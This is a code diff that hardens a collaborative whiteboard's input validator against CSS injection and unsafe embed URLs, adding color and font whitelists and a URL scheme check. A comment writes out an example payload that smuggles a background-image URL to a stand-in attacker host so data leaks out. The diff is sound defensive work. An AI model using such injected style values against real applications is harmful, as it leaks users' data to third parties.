@@ -74,6 +74,37 @@ const optStrNonEmpty = (v: unknown, cap = MAX_SHORT_LEN): boolean =>
 const optNum = (v: unknown, min = -MAX_COORD, max = MAX_COORD): boolean =>
   v === undefined || (typeof v === "number" && Number.isFinite(v) && v >= min && v <= max);
 
+/**
+ * SECURITY: strict CSS color whitelist. Object-renderer.tsx interpolates
+ * these values into inline style declarations (`style={{ background: o.color,
+ * color: o.textColor, stroke: ..., fill: ... }}`). React's inline-style API
+ * does NOT sanitize CSS values, so a peer broadcasting
+ *   color: "red; background-image: url(http://attacker.example/?steal=...)"
+ * would inject a real `background-image` declaration via the `;` boundary —
+ * silently exfiltrating data when the browser fetches the URL. CSS
+ * `expression()` / `-moz-binding` are dead in modern browsers, but URL
+ * fetches still work. Accept only the canonical CSS color forms:
+ *   - `#rgb`, `#rrggbb`, `#rgba`, `#rrggbbaa`
+ *   - `rgb()/rgba()/hsl()/hsla()` with only numbers, percentages, commas,
+ *     whitespace inside
+ *   - named-color tokens (letters only, capped at 32 chars — long enough
+ *     for "lightgoldenrodyellow")
+ * Anything else (including `transparent`, `currentColor`, gradients,
+ * `var(--foo)`) returns false; callers should fall back to a safe default.
+ */
+export const SAFE_CSS_COLOR_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;
+
+/** Helper: optional CSS color field. Allows undefined; otherwise must be
+ * a string ≤ MAX_COLOR_LEN AND match the strict whitelist. Empty string
+ * is treated as undefined (caller falls back to default). */
+const optColor = (v: unknown): boolean => {
+  if (v === undefined) return true;
+  if (typeof v !== "string") return false;
+  if (v.length === 0) return true;
+  if (v.length > MAX_COLOR_LEN) return false;
+  return SAFE_CSS_COLOR_RE.test(v.trim());
+};
+
 /** Kinds where w/h represent endpoint deltas rather than bbox size. For
  * line/arrow, dx/dy may be 0 (vertical line of zero horizontal span);
  * for connector, w/h are typically ignored entirely. All other kinds
@@ -142,12 +173,24 @@ export function isValidObject(o: unknown): o is WhiteboardObject {
     // non-empty when present.
     if (!optStrNonEmpty(sr.tool, MAX_SHORT_LEN) || !optStrNonEmpty(sr.entityId, MAX_ID_LEN)) return false;
   }
-  // Common style fields on most object kinds.
-  if (!optStr(r.color, MAX_COLOR_LEN)) return false;
-  if (!optStr(r.stroke, MAX_COLOR_LEN)) return false;
-  if (!optStr(r.fill, MAX_COLOR_LEN)) return false;
-  if (!optStr(r.textColor, MAX_COLOR_LEN)) return false;
-  if (!optStr(r.fontFamily, MAX_SHORT_LEN)) return false;
+  // SECURITY: every CSS color field flows into an inline `style={{ ... }}`
+  // declaration in object-renderer.tsx — without the strict whitelist a
+  // hostile realtime peer could inject extra CSS properties (background-
+  // image url for data exfiltration) past a value-terminating `;`.
+  if (!optColor(r.color)) return false;
+  if (!optColor(r.stroke)) return false;
+  if (!optColor(r.fill)) return false;
+  if (!optColor(r.textColor)) return false;
+  // fontFamily reaches inline styles too. CSS injection here is less
+  // dangerous (font-family doesn't accept url()), but a value like
+  // `serif; background-image: url(...)` still works. Restrict to a
+  // safe CSS identifier list: letters / digits / dashes / spaces /
+  // quotes / commas — covers `"Helvetica Neue", system-ui, sans-serif`
+  // while rejecting `;` / `{` / `}` / `(` / `)`.
+  if (r.fontFamily !== undefined) {
+    if (typeof r.fontFamily !== "string" || r.fontFamily.length > MAX_SHORT_LEN) return false;
+    if (r.fontFamily.length > 0 && !/^[a-zA-Z0-9 ,\-_"']+$/.test(r.fontFamily)) return false;
+  }
   if (!optNum(r.strokeWidth, 0, 1000)) return false;
   if (!optNum(r.fontSize, 0, 1000)) return false;
   if (!optNum(r.fontWeight, 0, 1000)) return false;
@@ -218,7 +261,9 @@ export function isValidObject(o: unknown): o is WhiteboardObject {
       // (toPos - fromPos) and produces NaN coords. Reject them at
       // ingest so they never reach the renderer.
       if (r.fromId === r.toId) return false;
-      if (typeof r.stroke !== "string" || r.stroke.length > MAX_COLOR_LEN) return false;
+      // CSS color whitelist — see optColor docs for why a bare length
+      // check is insufficient on fields that flow into inline styles.
+      if (typeof r.stroke !== "string" || !SAFE_CSS_COLOR_RE.test(r.stroke.trim()) || r.stroke.length > MAX_COLOR_LEN) return false;
       if (typeof r.strokeWidth !== "number" || !Number.isFinite(r.strokeWidth) || r.strokeWidth < 0 || r.strokeWidth > 1000) return false;
       if (!optStr(r.label, MAX_TITLE_LEN)) return false;
       // Routing must match the ConnectorRouting union. Without this
@@ -240,9 +285,29 @@ export function isValidObject(o: unknown): o is WhiteboardObject {
     case "embed":
       if (typeof r.src !== "string") return false;
       if (r.src.length > 8 * 1024 * 1024) return false; // 8 MB data URL cap
+      // SECURITY: scheme whitelist — same rules as clipboard.ts /
+      // object-renderer.tsx so the realtime ingest path can't smuggle
+      // `javascript:` / `data:text/html` / `data:image/svg+xml` past
+      // the per-renderer guards (the renderer DOES filter, but
+      // defense-in-depth means a future renderer change can't
+      // accidentally trust an unvalidated src). Allow http/https and
+      // raster-image data URLs; reject everything else.
+      {
+        const trimmedSrc = r.src.trim();
+        if (trimmedSrc.length > 0) {
+          const safeScheme =
+            /^https?:\/\//i.test(trimmedSrc) ||
+            /^data:image\/(?:png|jpe?g|webp|gif|avif)[;,]/i.test(trimmedSrc);
+          if (!safeScheme) return false;
+        }
+      }
       if (!optStr(r.alt, MAX_TITLE_LEN)) return false;
       if (r.fit !== undefined && r.fit !== "cover" && r.fit !== "contain") return false;
-      if (r.type === "embed" && !optStr(r.kind, MAX_SHORT_LEN)) return false;
+      if (r.type === "embed") {
+        // Embed kind must be a known value (used to route iframe normalisation).
+        if (r.kind !== undefined && r.kind !== "youtube" && r.kind !== "figma" &&
+            r.kind !== "loom" && r.kind !== "generic") return false;
+      }
       break;
     case "frame":
       if (!optStr(r.label, MAX_TITLE_LEN)) return false;
